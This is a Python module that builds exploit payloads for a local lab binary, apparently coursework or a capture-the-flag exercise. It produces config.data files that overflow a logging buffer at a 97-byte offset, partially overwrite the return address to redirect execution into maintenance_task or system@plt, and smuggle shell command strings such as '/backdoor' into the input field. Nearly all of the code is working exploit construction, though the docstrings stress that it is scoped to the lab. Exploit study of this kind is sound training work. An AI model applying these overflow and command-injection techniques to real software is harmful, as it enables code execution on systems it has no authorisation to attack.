"""Controlled-lab Phase II candidate payload builder.

This module is intentionally narrow: it only describes the supplied Project II
Phase II lab binary interface and produces a bounded `config.data` candidate for
that local Docker lab. It is not a general exploitation toolkit, does not touch
networks, and does not modify host/grader files.

Current status: the generated candidates are lab-specific bounded probes for
Phase II Medium. They preserve the official EC/IC protocol and never fabricate
`/shared/success.txt`. Official IC-side `/shared/success.txt` must still be
observed before any full-credit completion claim.
"""

from __future__ import annotations

from dataclasses import dataclass, asdict
from typing import Any


USER_INPUT_KEY = b"user_input="
# Observed from the supplied Phase II server_2 core dump: the saved return
# address in log_message is reached after 97 user_input bytes.
LOG_MESSAGE_RET_OFFSET = 97
# Returning to maintenance_task+5 skips the initial push and preserves 16-byte
# stack alignment for its libc call path in the supplied Ubuntu 24.04 lab.
MAINTENANCE_TASK_ALIGNED_ENTRY = 0x401475
MAINTENANCE_TASK_FRAME_BODY_ENTRY = 0x401486
MAINTENANCE_TASK_SYSTEM_RAX_ENTRY = 0x4014B1
SYSTEM_PLT_ENTRY = 0x401250
MAINTENANCE_COMMAND_PREFIX = b"'; /backdoor; #"
DIRECT_SYSTEM_COMMAND_PREFIX = b"x; /backdoor; #"
CURRENT_RDI_COMMAND_PREFIX = b"/backdoor #"
MULTILINE_STAGE_LENGTH = 2048


@dataclass(frozen=True)
class Phase2Candidate:
    content: bytes
    strategy_id: str
    input_profile: dict[str, Any]


def _partial_address_3(address: int) -> bytes:
    """Return low three bytes for a non-PIE partial RIP overwrite.

    The vulnerable path copies a C string, so full 64-bit addresses containing
    NUL bytes cannot be embedded before the overwrite completes. For non-PIE
    text addresses under 0x0040ffff, a three-byte overwrite is enough to retarget
    an existing 0x0040.... return address while the terminating NUL preserves the
    high bytes.
    """

    if not (0x400000 <= address <= 0x40FFFF):
        raise ValueError(f"address outside expected non-PIE text range: {address:#x}")
    raw = address.to_bytes(8, "little")[:3]
    if b"\x00" in raw:
        raise ValueError(f"partial address contains NUL byte: {address:#x}")
    return raw


def build_control_flow_probe() -> Phase2Candidate:
    """Build a byte-exact Phase II control-flow candidate for config.data.

    The candidate keeps the config format expected by parse_config(): a single
    `user_input=` line. It is byte-oriented because later Phase II attempts may
    need non-printable but non-NUL bytes. This probe is deliberately bounded and
    does not claim success by itself.
    """

    value = bytearray(MAINTENANCE_COMMAND_PREFIX)
    if len(value) > LOG_MESSAGE_RET_OFFSET:
        raise ValueError("probe prefix is longer than return-address offset")
    value.extend(b"A" * (LOG_MESSAGE_RET_OFFSET - len(value)))
    value.extend(_partial_address_3(MAINTENANCE_TASK_ALIGNED_ENTRY))
    content = USER_INPUT_KEY + bytes(value) + b"\n"
    return Phase2Candidate(
        content=content,
        strategy_id="phase2-medium-control-flow-probe",
        input_profile={
            "field_name": "user_input",
            "length": len(value),
            "config_bytes": len(content),
            "binary_safe": True,
            "placeholder_only": False,
            "ret_offset": LOG_MESSAGE_RET_OFFSET,
            "partial_target": hex(MAINTENANCE_TASK_ALIGNED_ENTRY),
            "status": "ret-to-maintenance-probe-not-success-claim",
        },
    )


def build_multiline_staging_probe() -> Phase2Candidate:
    """Build a two-line Phase II staging probe for config.data.

    The first line exercises the parser behavior verified on 2026-05-15:
    earlier `user_input=` lines can leave controlled bytes beyond the final
    line's terminating NUL in the global `user_input` area. The final line still
    triggers the stack overwrite and enters the maintenance body boundary. This
    is a bounded staging probe, not a success claim.
    """

    stage = bytearray(b"PHASE2-MULTILINE-STAGE;")
    if len(stage) > MULTILINE_STAGE_LENGTH:
        raise ValueError("stage marker exceeds staging length")
    stage.extend(b"S" * (MULTILINE_STAGE_LENGTH - len(stage)))

    final_value = bytearray(MAINTENANCE_COMMAND_PREFIX)
    if len(final_value) > LOG_MESSAGE_RET_OFFSET:
        raise ValueError("probe prefix is longer than return-address offset")
    final_value.extend(b"A" * (LOG_MESSAGE_RET_OFFSET - len(final_value)))
    final_value.extend(_partial_address_3(MAINTENANCE_TASK_FRAME_BODY_ENTRY))

    content = (
        USER_INPUT_KEY
        + bytes(stage)
        + b"\n"
        + USER_INPUT_KEY
        + bytes(final_value)
        + b"\n"
    )
    return Phase2Candidate(
        content=content,
        strategy_id="phase2-medium-multiline-staging-probe",
        input_profile={
            "field_name": "user_input",
            "line_count": 2,
            "stage_length": len(stage),
            "trigger_length": len(final_value),
            "config_bytes": len(content),
            "binary_safe": True,
            "placeholder_only": False,
            "ret_offset": LOG_MESSAGE_RET_OFFSET,
            "partial_target": hex(MAINTENANCE_TASK_FRAME_BODY_ENTRY),
            "status": "multiline-staging-boundary-not-success-claim",
        },
    )


def build_register_reuse_system_rax_probe() -> Phase2Candidate:
    """Build a bounded register-reuse probe for the Phase II lab.

    This candidate targets the `mov rdi, rax; call system@plt` sequence inside
    `maintenance_task()`. It tests one falsifiable idea only: whether `rax` after
    the final `log_message()` stream call points at a controlled shell command
    string. It is not a general sweep and is not a success claim.
    """

    value = bytearray(DIRECT_SYSTEM_COMMAND_PREFIX)
    if len(value) > LOG_MESSAGE_RET_OFFSET:
        raise ValueError("probe prefix is longer than return-address offset")
    value.extend(b"R" * (LOG_MESSAGE_RET_OFFSET - len(value)))
    value.extend(_partial_address_3(MAINTENANCE_TASK_SYSTEM_RAX_ENTRY))
    content = USER_INPUT_KEY + bytes(value) + b"\n"
    return Phase2Candidate(
        content=content,
        strategy_id="phase2-medium-register-reuse-system-rax-probe",
        input_profile={
            "field_name": "user_input",
            "length": len(value),
            "config_bytes": len(content),
            "binary_safe": True,
            "placeholder_only": False,
            "ret_offset": LOG_MESSAGE_RET_OFFSET,
            "partial_target": hex(MAINTENANCE_TASK_SYSTEM_RAX_ENTRY),
            "status": "register-reuse-system-rax-not-success-claim",
        },
    )


def build_current_rdi_system_probe() -> Phase2Candidate:
    """Build a bounded current-`rdi` first-argument probe.

    This candidate returns directly to `system@plt` and deliberately does not
    use appended ROP, saved RBP, or the post-logging `rax` value to set the
    first argument. It tests only whether `rdi` at `log_message()` return time
    still names a useful command string. It is not a success claim.
    """

    value = bytearray(CURRENT_RDI_COMMAND_PREFIX)
    if len(value) > LOG_MESSAGE_RET_OFFSET:
        raise ValueError("probe prefix is longer than return-address offset")
    value.extend(b"D" * (LOG_MESSAGE_RET_OFFSET - len(value)))
    value.extend(_partial_address_3(SYSTEM_PLT_ENTRY))
    content = USER_INPUT_KEY + bytes(value) + b"\n"
    return Phase2Candidate(
        content=content,
        strategy_id="phase2-medium-current-rdi-system-probe",
        input_profile={
            "field_name": "user_input",
            "length": len(value),
            "config_bytes": len(content),
            "binary_safe": True,
            "placeholder_only": False,
            "ret_offset": LOG_MESSAGE_RET_OFFSET,
            "partial_target": hex(SYSTEM_PLT_ENTRY),
            "status": "current-rdi-system-not-success-claim",
        },
    )


def build_phase2_candidate(strategy: str = "control-flow") -> Phase2Candidate:
    """Build a named controlled-lab Phase II candidate."""

    if strategy == "control-flow":
        return build_control_flow_probe()
    if strategy == "multiline-staging":
        return build_multiline_staging_probe()
    if strategy == "register-reuse-system-rax":
        return build_register_reuse_system_rax_probe()
    if strategy == "current-rdi-system":
        return build_current_rdi_system_probe()
    raise ValueError(f"unknown Phase II strategy: {strategy}")


def candidate_to_dict(candidate: Phase2Candidate) -> dict[str, Any]:
    data = asdict(candidate)
    data["content"] = candidate.content.decode("latin-1")
    return data
